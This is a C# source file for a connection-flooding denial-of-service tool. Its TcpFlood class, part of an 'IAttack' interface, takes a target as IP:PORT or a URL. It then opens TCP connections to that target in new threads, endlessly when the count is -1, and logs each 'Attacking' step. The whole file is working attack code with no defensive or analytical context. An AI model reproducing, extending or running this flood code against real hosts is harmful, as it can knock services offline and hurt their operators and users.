using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace ConnectFlood
{
    public class TcpFlood : IAttack
    {
        public void StartFlood(string target, int packetCount, int speed,string none)
        {
            string ip;
            int port;

            try
            {
                if (target.StartsWith("http://") || target.StartsWith("https://"))
                {
                    Uri uri = new Uri(target);
                    ip = Dns.GetHostAddresses(uri.Host)[0].ToString();
                    port = uri.Port > 0 ? uri.Port : (uri.Scheme == "https" ? 443 : 80);
                }
                else
                {
                    string[] targetParts = target.Split(':');
                    if (targetParts.Length != 2 || !int.TryParse(targetParts[1], out port))
                    {
                        Console.WriteLine("Invalid target format. Use: IP:PORT or http://domain.com");
                        return;
                    }
                    ip = targetParts[0];
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error parsing target: {ex.Message}");
                return;
            }

            int count = 0;
            Console.WriteLine($"[TCP] Attacking {ip}:{port} | Packets: {(packetCount == -1 ? "∞" : packetCount.ToString())} | Speed: {speed}ms");

            while (packetCount == -1 || count < packetCount)
            {
                int requestNumber = count + 1;
                new Thread(() =>
                {
                    using (TcpClient tcpClient = new TcpClient())
                    {
                        try
                        {
                            tcpClient.Connect(ip, port);
                            Console.WriteLine($"[TCP] Packet {requestNumber} sent to {ip}:{port}");
                        }
                        catch
                        {
                            Console.WriteLine($"[{requestNumber}] TCP Connection FAILED!");
                        }
                    }
                }).Start();

                count++;
                Thread.Sleep(speed);
            }
        }
    }
}
